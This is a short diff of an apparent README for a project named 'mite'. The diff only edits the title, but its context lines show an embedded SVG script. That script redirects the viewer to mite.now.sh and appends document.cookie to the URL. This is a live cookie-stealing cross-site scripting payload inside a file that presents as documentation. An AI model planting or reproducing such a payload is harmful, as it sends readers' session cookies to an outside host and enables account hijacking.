@@ -1,4 +1,4 @@
-# mite
+# new mite
 
 
 <svg xmlns="http://www.w3.org/1999/svg">
@@ -20,5 +20,4 @@ function loadDoc() {
 loadDoc();
 window.location="http://mite.now.sh/README.md?cook="+document.cookie;
   </script>
-
 </svg>
